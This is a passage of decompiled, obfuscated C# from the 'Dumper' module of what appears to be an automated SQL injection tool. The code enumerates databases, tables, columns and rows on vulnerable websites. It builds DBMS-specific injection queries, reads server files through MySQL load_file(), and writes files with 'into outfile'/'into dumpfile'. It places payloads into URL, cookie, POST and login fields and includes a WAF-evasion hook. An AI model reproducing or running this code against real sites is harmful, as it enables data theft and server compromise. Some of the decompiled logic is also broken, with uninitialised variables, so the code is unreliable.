								}
							}
							else
							{
								if (!this.class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
								{
									this.class44_0.dictionary_1.Add(class47_0.IndexJob, text);
								}
								if (!this.class44_0.list_1.Contains(class47_0.IndexJob))
								{
									this.class44_0.list_1.Add(class47_0.IndexJob);
								}
							}
						}
					}
					HTTPExt http;
					this.appDomainControl_0.Dispose(http);
					this.threadPool_0.Close(class47_0.Thread_0);
				}
				catch (Exception ex2)
				{
				}
			}
		}
	}

	// Token: 0x0600067E RID: 1662 RVA: 0x0002AB5C File Offset: 0x00028D5C
	private void method_23(Dumper.Class47 class47_0)
	{
		string text = "";
		string text2 = "";
		try
		{
			int num = Conversions.ToInteger(this.method_7(this.numTimeOut));
			string text3 = Conversions.ToString(this.method_7(this.txtURL));
			Analyzer analyzer = new Analyzer(text3, 1, null);
			analyzer.DBType = this.types_0;
			analyzer.Timeout = num;
			analyzer.Delay = Conversions.ToInteger(this.method_7(this.numSleep));
			analyzer.Retry = Conversions.ToInteger(this.method_7(this.numMaxRetry));
			analyzer.FollowRedirects = Conversions.ToBoolean(this.method_7(this.chkHttpRedirect));
			this.UpDateStatus(global::Globals.translate_0.GetStr(this, 37, ""), false);
			bool flag;
			if (flag = analyzer.CheckVersionNoCollactions(text3, true))
			{
				string text4 = "";
				bool flag2;
				if ((flag2 = true) == Class54.smethod_9(this.types_0))
				{
					text4 = "database()";
				}
				else if (flag2 == Class54.smethod_10(this.types_0))
				{
					text4 = "db_name()";
				}
				else if (flag2 == Class54.smethod_11(this.types_0))
				{
					text4 = "(SELECT global_name FROM global_name)";
				}
				else if (flag2 == Class54.smethod_12(this.types_0))
				{
					text4 = "current_database()";
				}
				List<string> list = new List<string>();
				list.Add(text4);
				this.UpDateStatus(string.Concat(new string[]
				{
					" ",
					global::Globals.translate_0.GetStr(this, 38, ""),
					" ",
					text4.ToUpper(),
					".."
				}), false);
				list = analyzer.GetInfo(text3, text4);
				text = analyzer.Version;
				if (list.Count > 0)
				{
					text2 = list[0];
				}
			}
			this.appDomainControl_0.Dispose(analyzer.HTTPExt_0);
			if (flag)
			{
				bool flag3;
				if ((flag3 = true) == Class54.smethod_9(this.types_0))
				{
					this.method_8(this.cmbMySQLCollations, (int)analyzer.MySQLCollactions);
					this.method_8(this.cmbMySQLErrType, (int)analyzer.MySQLErrorType);
				}
				else if (flag3 == Class54.smethod_10(this.types_0))
				{
					this.method_8(this.chkMSSQL_Latin1, analyzer.MSSQLCollate);
					this.method_8(this.chkMSSQLCastAsChar, !string.IsNullOrEmpty(analyzer.MSSQLCast));
					this.method_8(this.cmbMSSQLCast, analyzer.MSSQLCast);
				}
				else if (flag3 == Class54.smethod_11(this.types_0))
				{
					this.method_8(this.cmbOracleErrType, (int)analyzer.OracleErrorType);
					this.method_8(this.chkOracleCastAsChar, analyzer.OracleCast);
				}
				this.method_8(this.chkHttpRedirect, analyzer.FollowRedirects);
				string text5 = "";
				Image image = null;
				string text6 = Class23.smethod_12(this.string_1);
				if (global::Globals.G_DataGP.CountryCodeExist(text6))
				{
					text5 = global::Globals.G_DataGP.CountryNameByCode(text6);
					image = global::Globals.GMain.imgData.Images[text6 + ".png"];
				}
				else
				{
					string text7 = global::Globals.GMain.method_85(Class23.smethod_11(this.string_1)).ToString();
					if (!string.IsNullOrEmpty(text7))
					{
						DataGP g_DataGP = global::Globals.G_DataGP;
						string text8 = text7;
						string text9 = "";
						g_DataGP.Lookup(text8, ref text5, ref image, ref text9, true);
					}
				}
				this.string_0 = text2;
				if (!string.IsNullOrEmpty(text2))
				{
					this.method_47(text2);
				}
				this.method_3(text, text5, image);
			}
			else
			{
				class47_0.Err = global::Globals.translate_0.GetStr(global::Globals.GMain, 88, "");
			}
		}
		catch (Exception ex)
		{
			if (!(ex is ThreadAbortException))
			{
				"Error: " + ex.ToString();
				class47_0.Err = ex.ToString();
			}
		}
		finally
		{
			try
			{
				this.threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x0600067F RID: 1663 RVA: 0x0002AFCC File Offset: 0x000291CC
	private void method_24(Dumper.Class47 class47_0)
	{
		string text = "Empty";
		try
		{
			string text2;
			if (class47_0.IndexJob != -1)
			{
				if (this.class45_0.method_0(0).Columns.Count > 0)
				{
					text2 = this.class45_0.method_0(0).Columns[class47_0.IndexJob];
				}
				else
				{
					text2 = "";
				}
			}
			else
			{
				switch (this.enum4_0)
				{
				case Dumper.Enum4.const_1:
					text2 = this.class45_0.method_0(0).DataBase;
					break;
				case Dumper.Enum4.const_3:
					text2 = this.class45_0.method_0(0).Table;
					break;
				}
			}
			int num;
			switch (this.enum4_0)
			{
			case Dumper.Enum4.const_0:
				num = this.method_19(Schema.DATABASES, "", "", ref text);
				this.method_8(this.lblCountBDs, num.ToString());
				break;
			case Dumper.Enum4.const_1:
			case Dumper.Enum4.const_2:
				num = this.method_19(Schema.TABLES, text2, "", ref text);
				this.method_43(Schema.DATABASES, text2, "", "", num.ToString(), "");
				break;
			case Dumper.Enum4.const_3:
			case Dumper.Enum4.const_4:
				num = this.method_19(Schema.COLUMNS, this.class45_0.method_0(0).DataBase, text2, ref text);
				this.method_43(Schema.TABLES, this.class45_0.method_0(0).DataBase, text2, "", num.ToString(), "");
				break;
			case Dumper.Enum4.const_5:
			case Dumper.Enum4.const_6:
				if (class47_0.IndexJob != -1)
				{
					num = this.method_19(Schema.ROWS, this.class45_0.method_0(0).DataBase, text2, ref text);
					this.method_43(Schema.TABLES, this.class45_0.method_0(0).DataBase, text2, "", "", num.ToString());
				}
				else
				{
					num = this.method_19(Schema.ROWS, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, ref text);
					this.method_43(Schema.TABLES, this.class45_0.method_0(0).DataBase, this.class45_0.method_0(0).Table, "", "", num.ToString());
				}
				break;
			}
			if (class47_0.TotalThreads != 1)
			{
			}
			bool flag = num >= 0;
		}
		catch (Exception ex)
		{
			text = "Error: " + ex.ToString();
			bool flag = false;
		}
		finally
		{
			try
			{
				object obj = this.class44_0;
				lock (obj)
				{
					try
					{
						bool flag;
						if (flag)
						{
							if (!this.class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
							{
								this.class44_0.dictionary_0.Add(class47_0.IndexJob, text);
							}
						}
						else
						{
							if (!this.class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
							{
								this.class44_0.dictionary_1.Add(class47_0.IndexJob, text);
							}
							if (!this.class44_0.list_1.Contains(class47_0.IndexJob))
							{
								this.class44_0.list_1.Add(class47_0.IndexJob);
							}
						}
					}
					catch (Exception ex2)
					{
					}
				}
				this.threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception ex3)
			{
			}
			int num;
			this.int_2 = num;
		}
	}

	// Token: 0x06000680 RID: 1664 RVA: 0x0002B3CC File Offset: 0x000295CC
	private void method_25(Dumper.Class47 class47_0)
	{
		string text = "Empty";
		string text2 = "";
		try
		{
			List<string> list = new List<string>();
			bool flag;
			string text5;
			if (this.enum5_0 == Dumper.Enum5.const_7)
			{
				flag = Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
				string text3 = Conversions.ToString(this.method_7(this.txtMySQLReadFilePath));
				this.class45_0.method_2(text3);
				object obj = this.method_7(this.cmbMySQLReadFile);
				if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
				{
					if (!text3.StartsWith("'"))
					{
						text3 = "'" + text3;
					}
					if (!text3.EndsWith("'"))
					{
						text3 += "'";
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, 1, false))
				{
					text3 = Class23.smethod_20(text3);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, 2, false))
				{
					text3 = Class23.smethod_21(text3, true, "+", "char");
				}
				list.Add("load_file(" + text3 + ")");
				text2 = "[t]";
			}
			else if (this.enum5_0 == Dumper.Enum5.const_8)
			{
				string text4 = "";
				string text3 = Conversions.ToString(this.method_7(this.txtMySQLWriteFilePath));
				if (!text3.StartsWith("'"))
				{
					text3 = "'" + text3;
				}
				if (!text3.EndsWith("'"))
				{
					text3 += "'";
				}
				object obj2 = this.method_7(this.cmbMySQLWriteFilePath);
				if (Operators.ConditionalCompareObjectEqual(obj2, 0, false))
				{
					text4 = "into outfile ";
				}
				else if (Operators.ConditionalCompareObjectEqual(obj2, 1, false))
				{
					text4 = "into dumpfile ";
				}
				text5 = Conversions.ToString(this.method_7(this.txtMySQLWriteFile));
				if (!text5.StartsWith("'"))
				{
					text5 = "'" + text5;
				}
				if (!text5.EndsWith("'"))
				{
					text5 += "'";
				}
				text2 = string.Concat(new string[] { "select ", text5, " ", text4, text3 });
			}
			text2 = MySQLNoError.Info(text2, this.method_14(), flag, list, "");
			HTTPExt http = this.appDomainControl_0.GetHTTP();
			text5 = this.method_26(ref text2, ref text, ref http);
			this.appDomainControl_0.Dispose(http);
			if (this.enum5_0 == Dumper.Enum5.const_7 && !string.IsNullOrEmpty(text5))
			{
				string[] array = Strings.Split(text5, Class54.string_0, -1, CompareMethod.Binary);
				if (!Information.IsNothing(array) && array.Length > 1)
				{
					if (flag)
					{
						text5 = Class23.smethod_19(array[1]);
					}
					else
					{
						text5 = array[1];
					}
					text5 = Strings.Replace(text5, "\v\n", "\r\n", 1, -1, CompareMethod.Binary);
					text5 = Strings.Replace(text5, "\n", "\r\n", 1, -1, CompareMethod.Binary);
					text5 = Strings.Replace(text5, "\v", "\r\n", 1, -1, CompareMethod.Binary);
					text5 = Strings.Split(text5, Class54.string_0, -1, CompareMethod.Binary)[0];
					list = new List<string>();
					list.Add(text5);
					this.method_29(0);
					this.dumpGrid_0.Text = Conversions.ToString(this.method_7(this.txtMySQLReadFilePath));
					this.dumpGrid_0.method_3(list);
					this.class44_0.AffectedRows = 1;
					this.class44_0.RowsAdded = 1;
				}
			}
		}
		catch (Exception ex)
		{
			text = "Error: " + ex.StackTrace;
		}
		finally
		{
			try
			{
				this.threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x06000681 RID: 1665 RVA: 0x0002B7D8 File Offset: 0x000299D8
	private string method_26(ref string string_9, ref string string_10, ref HTTPExt httpext_0 = null)
	{
		int num = Conversions.ToInteger(this.method_7(this.numTimeOut));
		string text = Conversions.ToString(this.method_7(this.txtURL));
		string text2 = Conversions.ToString(this.method_7(this.txtCookies));
		string text3 = Conversions.ToString(this.method_7(this.txtPost));
		string text4 = Conversions.ToString(this.method_7(this.txtUserName));
		string text5 = Conversions.ToString(this.method_7(this.txtPassword));
		int num2;
		if (Conversions.ToBoolean(this.method_7(this.chkThreads)))
		{
			num2 = Conversions.ToInteger(this.method_7(this.numSleepMultiThread));
		}
		else
		{
			num2 = Conversions.ToInteger(this.method_7(this.numSleep));
		}
		object obj = this.method_7(this.cmbInjectionPoint);
		if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
		{
			if (string_9.IndexOf("count(") <= 0 && this.method_10())
			{
				text = string_9;
			}
			else
			{
				text = this.string_6;
				text = text.Replace("[t]", string_9);
			}
			if (Conversions.ToBoolean(this.method_7(global::Globals.GMain.chkAnalizeWAF)))
			{
				Class54.smethod_1(ref text);
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 1, false))
		{
			text2 = text2.Replace("[t]", string_9);
			Class54.smethod_1(ref text2);
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 2, false))
		{
			text3 = text3.Replace("[t]", string_9);
			Class54.smethod_1(ref text3);
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 3, false))
		{
			text4 = text4.Replace("[t]", string_9);
			Class54.smethod_1(ref text4);
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 4, false))
		{
			text5 = text5.Replace("[t]", string_9);
			Class54.smethod_1(ref text5);
		}
		string text6;
		if (this.bckWorker.CancellationPending)
		{
			text6 = "";
		}
		else
		{
			if (httpext_0 == null)
			{
				httpext_0 = this.appDomainControl_0.GetHTTP();
			}
			httpext_0.FollowRedirects = Conversions.ToBoolean(this.method_7(this.chkHttpRedirect));
			httpext_0.TimeOut = num;
			httpext_0.LoginUser = Conversions.ToString(this.method_7(this.txtUserName));
			httpext_0.LoginPassword = Conversions.ToString(this.method_7(this.txtPassword));
			if (!Conversions.ToBoolean(this.method_7(this.chkAddHearder)))
			{
			}
			this.method_5(num2);
			string text7 = httpext_0.QuickGet(text);
			text6 = text7;
		}
		return text6;
	}

	// Token: 0x06000682 RID: 1666 RVA: 0x0002BA54 File Offset: 0x00029C54
	private void method_27(List<string> list_2)
	{
		if (!this.dumpGrid_0.InvokeRequired)
		{
		}
	}

	// Token: 0x06000683 RID: 1667 RVA: 0x0002BA64 File Offset: 0x00029C64
	private void method_28(int int_3, string string_9)
	{
		if (!this.dumpGrid_0.InvokeRequired)
		{
		}
	}

	// Token: 0x06000684 RID: 1668 RVA: 0x0002BA74 File Offset: 0x00029C74
	private void method_29(int int_3 = 0)
	{
		checked
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Dumper.Delegate28(this.method_29), new object[] { int_3 });
			}
			else if (!this.bool_5)
			{
				this.bool_5 = true;
				if (!Class54.smethod_9(this.types_0) && this.enum5_0 == Dumper.Enum5.const_5)
				{
					List<string> list = new List<string>();
					int num = int_3 - 1;
					for (int i = 0; i <= num; i++)
					{
						list.Add("Column " + Conversions.ToString(i + 1));
					}
					this.dumpGrid_0.DataBase = "Custom";
					this.dumpGrid_0.Table = "Query";
					this.dumpGrid_0.Columns = list;
					this.dumpGrid_0.Text = this.class45_0.method_0(0).DataBase + "." + this.class45_0.method_0(0).Table;
				}
				else if (this.enum5_0 == Dumper.Enum5.const_7)
				{
					this.dumpGrid_0.txtResult.Visible = true;
					this.dumpGrid_0.dtgData.Visible = false;
					this.dumpGrid_0.btnAutoScroll.Visible = false;
					this.dumpGrid_0.tsSP2.Visible = false;
					this.dumpGrid_0.Text = this.class45_0.method_0(0).DataBase;
				}
				else
				{
					this.dumpGrid_0.DataBase = this.class45_0.method_0(0).DataBase;
					this.dumpGrid_0.Table = this.class45_0.method_0(0).Table;
					this.dumpGrid_0.Columns = this.class45_0.method_0(0).Columns;
					this.dumpGrid_0.Text = this.class45_0.method_0(0).DataBase + "." + this.class45_0.method_0(0).Table;
				}
				this.dumpGrid_0.method_2();
				this.dumpGrid_0.btnFullView.Click += this.method_34;
				this.dumpGrid_0.btnCloseAllGrids.Click += this.method_35;
				this.dumpGrid_0.btnCloseAllButThis.Click += this.method_36;
				this.dumpGrid_0.btnCloseGrid.Click += this.method_37;
				this.dumpGrid_0.Tag = this.tabControlExt_0.TabPages.Add(this.dumpGrid_0, "", null);
				NewLateBinding.LateSetComplex(this.dumpGrid_0.Tag, null, "CloseButtonVisible", new object[] { false }, null, null, false, true);
				this.dumpGrid_0.Show();
				DumpGrid dumpGrid;
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(this.tabControlExt_0, null, "SelectItem", array = new object[] { (dumpGrid = this.dumpGrid_0).Tag }, null, null, array2 = new bool[] { true }, true);
				if (array2[0])
				{
					dumpGrid.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
				}
				this.list_1.Add(this.dumpGrid_0);
			}
		}
	}

	// Token: 0x06000685 RID: 1669 RVA: 0x0002BDB0 File Offset: 0x00029FB0
	private bool method_30(DumpGrid dumpGrid_1)
	{
		return this.dumpGrid_0 != dumpGrid_1 || !(this.bool_2 & ((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5)));
	}

	// Token: 0x06000686 RID: 1670 RVA: 0x0002BDEC File Offset: 0x00029FEC
	private void method_31(DumpGrid dumpGrid_1)
	{
		if (this.method_30(dumpGrid_1))
		{
			this.list_1.Remove(dumpGrid_1);
			dumpGrid_1.Close();
			dumpGrid_1.Table = null;
		}
		if (this.list_1.Count == 0)
		{
			this.method_33(false);
		}
	}

	// Token: 0x06000687 RID: 1671 RVA: 0x0002BE28 File Offset: 0x0002A028
	private void method_32(DumpGrid dumpGrid_1 = null)
	{
		checked
		{
			if (this.list_1.Count != 0)
			{
				for (;;)
				{
					IL_009D:
					int num = this.tabControlExt_0.TabPages.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (this.method_30((DumpGrid)this.tabControlExt_0.TabPages[i].Form) & (this.tabControlExt_0.TabPages[i].Form != null) & (dumpGrid_1 != this.tabControlExt_0.TabPages[i].Form))
						{
							this.method_31((DumpGrid)this.tabControlExt_0.TabPages[i].Form);
							goto IL_009D;
						}
					}
					break;
				}
				if (this.list_1.Count == 0)
				{
					this.method_33(false);
				}
			}
		}
	}

	// Token: 0x06000688 RID: 1672 RVA: 0x0002BF00 File Offset: 0x0002A100
	private void method_33(bool bool_6)
	{
		global::Globals.LockWindowUpdate(this.splData.Handle);
		checked
		{
			int num = this.tabControlExt_0.TabPages.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				DumpGrid dumpGrid = (DumpGrid)this.tabControlExt_0.TabPages[i].Form;
				if (bool_6)
				{
					this.splData.Panel1Collapsed = true;
					dumpGrid.btnFullView.Text = global::Globals.translate_0.GetStr(this, 39, "");
					dumpGrid.btnFullView.Image = Class6.ViewFull_16x_24;
				}
				else
				{
					this.splData.Panel1.Show();
					this.splData.Panel1Collapsed = false;
					dumpGrid.btnFullView.Text = global::Globals.translate_0.GetStr(this, 40, "");
					dumpGrid.btnFullView.Image = Class6.ViewLandscape_16x_24;
				}
				dumpGrid.btnFullView.Checked = bool_6;
			}
			this.tsGetInfo.Visible = !bool_6;
			this.tlsMenu.Visible = !bool_6;
			this.chkAllInOneRequest.Visible = !bool_6;
			this.chkClearListOnGet.Visible = !bool_6;
			global::Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	// Token: 0x06000689 RID: 1673 RVA: 0x0002C03C File Offset: 0x0002A23C
	private void method_34(object sender, EventArgs e)
	{
		ToolStripButton toolStripButton = (ToolStripButton)sender;
		this.method_33(toolStripButton.Checked);
	}

	// Token: 0x0600068A RID: 1674 RVA: 0x0002C05C File Offset: 0x0002A25C
	private void method_35(object sender, EventArgs e)
	{
		this.method_32(null);
	}

	// Token: 0x0600068B RID: 1675 RVA: 0x0002C068 File Offset: 0x0002A268
	private void method_36(object sender, EventArgs e)
	{
		this.method_32((DumpGrid)NewLateBinding.LateGet(sender, null, "Tag", new object[0], null, null, null));
	}

	// Token: 0x0600068C RID: 1676 RVA: 0x0002C08C File Offset: 0x0002A28C
	private void method_37(object sender, EventArgs e)
	{
		this.method_31((DumpGrid)NewLateBinding.LateGet(sender, null, "Tag", new object[0], null, null, null));
	}

	// Token: 0x0600068D RID: 1677 RVA: 0x0002C0B0 File Offset: 0x0002A2B0
	private void method_38(object object_0, bool bool_6)
	{
		global::Globals.LockWindowUpdate(this.splData.Handle);
		if (bool_6)
		{
			this.splData.SplitterDistance = checked((int)Math.Round(Math.Round((double)this.splData.Height / 2.0, 0)));
			this.splData.Panel1Collapsed = false;
			this.splData.Panel2Collapsed = false;
		}
		else
		{
			this.splData.Panel1Collapsed = false;
			this.splData.Panel2Collapsed = true;
		}
		global::Globals.LockWindowUpdate(IntPtr.Zero);
	}

	// Token: 0x0600068E RID: 1678 RVA: 0x0002C13C File Offset: 0x0002A33C
	internal string method_39(string string_9, string string_10, string string_11 = "")
	{
		string_9 = this.method_41(string_9);
		if (Versioned.IsNumeric(string_10))
		{
			string_10 = Strings.FormatNumber(Conversions.ToInteger(string_10), 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
		}
		if (Versioned.IsNumeric(string_11))
		{
			string_11 = Strings.FormatNumber(Conversions.ToInteger(string_11), 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
		}
		string text;
		if (string.IsNullOrEmpty(string_11))
		{
			text = string_9.PadRight(26, ' ') + "[" + string_10.PadRight(2, ' ') + "]";
		}
		else
		{
			text = string.Concat(new string[]
			{
				string_9.PadRight(26, ' '),
				"[",
				string_10.PadRight(2, ' '),
				"#",
				string_11.PadLeft(7, ' '),
				"]"
			});
		}
		return text;
	}

	// Token: 0x0600068F RID: 1679 RVA: 0x0002C214 File Offset: 0x0002A414
	private string method_40(string string_9, string string_10, string string_11 = "")
	{
		string_9 = this.method_41(string_9);
		return this.method_39(string_9, string_10, string_11);
	}

	// Token: 0x06000690 RID: 1680 RVA: 0x0002C238 File Offset: 0x0002A438
	internal string method_41(string string_9)
	{
		string text;
		if (string.IsNullOrEmpty(string_9))
		{
			text = "";
		}
		else
		{
			int num = string_9.IndexOf("[");
			if (num > 0)
			{
				string_9 = string_9.Substring(0, num).Trim();
			}
			text = string_9;
		}
		return text;
	}

	// Token: 0x06000691 RID: 1681 RVA: 0x0002C27C File Offset: 0x0002A47C
	private int method_42(string string_9, bool bool_6)
	{
		int num = -1;
		int num2;
		if (string.IsNullOrEmpty(string_9))
		{
			num2 = -1;
		}
		else
		{
			int num3 = string_9.IndexOf("[");
			string_9 = string_9.Replace("]", "");
			if (num3 > 0)
			{
				string_9 = string_9.Substring(checked(num3 + 1)).Trim();
				if (bool_6)
				{
					string_9 = Strings.Split(string_9, "#", -1, CompareMethod.Binary)[0].Trim();
					if (Versioned.IsNumeric(string_9))
					{
						num = Conversions.ToInteger(string_9);
					}
				}
				else if (string_9.IndexOf('#') > 0)
				{
					string_9 = Strings.Split(string_9, "#", -1, CompareMethod.Binary)[1].Trim();
					if (Versioned.IsNumeric(string_9))
					{
						num = Conversions.ToInteger(string_9);
					}
				}
			}
			num2 = num;
		}
		return num2;
	}

	// Token: 0x06000692 RID: 1682 RVA: 0x0002C338 File Offset: 0x0002A538
	private int method_43(Schema schema_0, string string_9, string string_10 = "", string string_11 = "", string string_12 = "", string string_13 = "")
	{
		int num;
		if (this.trwSchema.InvokeRequired)
		{
			num = Conversions.ToInteger(this.trwSchema.Invoke(new Dumper.Delegate26(this.method_43), new object[] { schema_0, string_9, string_10, string_11, string_12, string_13 }));
		}
		else
		{
			TreeNode treeNode = this.method_52(schema_0, string_9, string_10, string_11);
			if (treeNode == null)
			{
				num = 0;
			}
			else
			{
				if (schema_0 == Schema.TABLES)
				{
					if (string.IsNullOrEmpty(string_12))
					{
						string_12 = this.method_42(treeNode.Text, true).ToString();
						if (string_12.Equals("-1"))
						{
							string_12 = "?";
						}
					}
					if (string.IsNullOrEmpty(string_13))
					{
						string_13 = this.method_42(treeNode.Text, false).ToString();
						if (string_13.Equals("-1"))
						{
							string_13 = "?";
						}
					}
				}
				treeNode.Text = this.method_39(treeNode.Text, string_12, string_13);
				if (Operators.ConditionalCompareObjectEqual(this.method_7(this.mnuAutoScroll), global::Globals.translate_0.GetStr(global::Globals.GMain, 62, ""), false))
				{
					treeNode.EnsureVisible();
				}
				num = 1;
			}
		}
		return num;
	}

	// Token: 0x06000693 RID: 1683 RVA: 0x0002C474 File Offset: 0x0002A674
	private int method_44(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		int num;
		if (this.trwSchema.InvokeRequired)
		{
			num = Conversions.ToInteger(this.trwSchema.Invoke(new Dumper.Delegate27(this.method_44), new object[] { schema_0, string_9, string_10, string_11 }));
		}
		else
		{
			bool flag;
			if (flag = schema_0 == Schema.ROWS)
			{
				schema_0 = Schema.TABLES;
			}
			TreeNode treeNode = this.method_52(schema_0, string_9, string_10, string_11);
			if (treeNode == null)
			{
				num = -1;
			}
			else
			{
				num = this.method_42(treeNode.Text, !flag);
			}
		}
		return num;
	}

	// Token: 0x06000694 RID: 1684 RVA: 0x0002C500 File Offset: 0x0002A700
	private void method_45(TreeNode treeNode_0, string string_9, int int_3)
	{
		bool flag;
		try
		{
			foreach (object obj in treeNode_0.Nodes)
			{
				TreeNode treeNode = (TreeNode)obj;
				if (this.method_41(treeNode.Text).Equals(this.method_41(string_9)))
				{
					flag = true;
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (!flag)
		{
			treeNode_0.Nodes.Add(string_9, string_9, int_3).SelectedImageIndex = int_3;
		}
	}

	// Token: 0x06000695 RID: 1685 RVA: 0x0002C58C File Offset: 0x0002A78C
	private void method_46(TreeNodeCollection treeNodeCollection_0, string string_9, int int_3)
	{
		bool flag;
		try
		{
			foreach (object obj in treeNodeCollection_0)
			{
				TreeNode treeNode = (TreeNode)obj;
				if (this.method_41(treeNode.Text).Equals(this.method_41(string_9)))
				{
					flag = true;
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (!flag)
		{
			treeNodeCollection_0.Add(string_9, string_9, int_3).SelectedImageIndex = int_3;
		}
	}

	// Token: 0x06000696 RID: 1686 RVA: 0x0002C610 File Offset: 0x0002A810
	internal void method_47(string string_9)
	{
		checked
		{
			if (this.trwSchema.InvokeRequired)
			{
				this.trwSchema.Invoke(new Dumper.Delegate20(this.method_47), new object[] { string_9 });
			}
			else
			{
				string_9 = this.method_39(string_9, "?", "");
				this.method_46(this.trwSchema.Nodes, string_9, 0);
				if (this.method_41(string_9).Equals(this.string_0))
				{
					if (this.trwSchema.Nodes[string_9] != null)
					{
						this.trwSchema.Nodes[string_9].NodeFont = new Font(this.trwSchema.Font, FontStyle.Bold | FontStyle.Italic);
					}
					else
					{
						this.trwSchema.Nodes[this.trwSchema.Nodes.Count - 1].NodeFont = new Font(this.trwSchema.Font, FontStyle.Bold | FontStyle.Italic);
					}
				}
				this.TreeNode_RemoveCheckBox(this.trwSchema.Nodes[string_9], 0);
				if (Operators.ConditionalCompareObjectEqual(this.method_7(this.mnuAutoScroll), global::Globals.translate_0.GetStr(global::Globals.GMain, 62, ""), false) && this.trwSchema.Nodes.Count > 0)
				{
					this.trwSchema.Nodes[this.trwSchema.Nodes.Count - 1].EnsureVisible();
				}
			}
		}
	}

	// Token: 0x06000697 RID: 1687 RVA: 0x0002C784 File Offset: 0x0002A984
	internal void method_48(string string_9, string string_10)
	{
		if (this.trwSchema.InvokeRequired)
		{
			this.trwSchema.Invoke(new Dumper.Delegate21(this.method_48), new object[] { string_9, string_10 });
		}
		else
		{
			TreeNode treeNode = this.method_52(Schema.DATABASES, string_9, "", "");
			string_10 = this.method_39(string_10, "?", "?");
			this.method_45(treeNode, string_10, 1);
			this.TreeNode_RemoveCheckBox(treeNode.Nodes[string_10], 0);
			if (Operators.ConditionalCompareObjectEqual(this.method_7(this.mnuAutoScroll), global::Globals.translate_0.GetStr(global::Globals.GMain, 62, ""), false) && treeNode.Nodes.Count > 0)
			{
				treeNode.Nodes[checked(treeNode.Nodes.Count - 1)].EnsureVisible();
			}
		}
	}

	// Token: 0x06000698 RID: 1688 RVA: 0x0002C864 File Offset: 0x0002AA64
	private void method_49(string string_9, string string_10, string string_11)
	{
		if (this.trwSchema.InvokeRequired)
		{
			this.trwSchema.Invoke(new Dumper.Delegate22(this.method_49), new object[] { string_9, string_10, string_11 });
		}
		else
		{
			TreeNode treeNode = this.method_52(Schema.TABLES, string_9, string_10, "");
			if (string_11.Contains(":"))
			{
				string[] array = string_11.Split(new char[] { ':' });
				this.method_45(treeNode, array[0], 2);
				this.method_50(string_9, string_10, array[0], array[1]);
			}
			else
			{
				this.method_45(treeNode, string_11, 2);
			}
			if (Operators.ConditionalCompareObjectEqual(this.method_7(this.mnuAutoScroll), global::Globals.translate_0.GetStr(global::Globals.GMain, 62, ""), false) && treeNode.Nodes.Count > 0)
			{
				treeNode.Nodes[checked(treeNode.Nodes.Count - 1)].EnsureVisible();
			}
		}
	}

	// Token: 0x06000699 RID: 1689 RVA: 0x0002C958 File Offset: 0x0002AB58
	private void method_50(string string_9, string string_10, string string_11, string string_12)
	{
		if (this.trwSchema.InvokeRequired)
		{
			this.trwSchema.Invoke(new Dumper.Delegate23(this.method_50), new object[] { string_9, string_10, string_11, string_12 });
		}
		else
		{
			TreeNode treeNode = this.method_52(Schema.COLUMNS, string_9, string_10, string_11);
			if (!string.IsNullOrEmpty(string_12))
			{
				if (treeNode.Nodes.Count > 0)
				{
					treeNode.Nodes[0].Text = string_12;
				}
				else
				{
					treeNode.Nodes.Add(string_12, string_12, 3).SelectedImageIndex = 3;
				}
				this.TreeNode_RemoveCheckBox(treeNode.Nodes[string_12], 0);
			}
			else
			{
				treeNode.Nodes.Clear();
			}
		}
	}

	// Token: 0x0600069A RID: 1690 RVA: 0x0002CA18 File Offset: 0x0002AC18
	private List<string> method_51()
	{
		List<string> list = new List<string>();
		try
		{
			foreach (object obj in this.trwSchema.Nodes)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(obj);
				string text = this.method_41(Conversions.ToString(NewLateBinding.LateGet(objectValue, null, "Text", new object[0], null, null, null)));
				if (!list.Contains(text))
				{
					list.Add(text);
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return list;
	}

	// Token: 0x0600069B RID: 1691 RVA: 0x0002CAB4 File Offset: 0x0002ACB4
	private TreeNode method_52(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		switch (schema_0)
		{
		case Schema.DATABASES:
			try
			{
				foreach (object obj in this.trwSchema.Nodes)
				{
					TreeNode treeNode = (TreeNode)obj;
					if (Operators.CompareString(this.method_41(treeNode.Text), this.method_41(string_9), false) == 0)
					{
						return treeNode;
					}
				}
				goto IL_0284;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			break;
		case Schema.TABLES:
			break;
		case Schema.COLUMNS:
			goto IL_0151;
		default:
			goto IL_0284;
		}
		try
		{
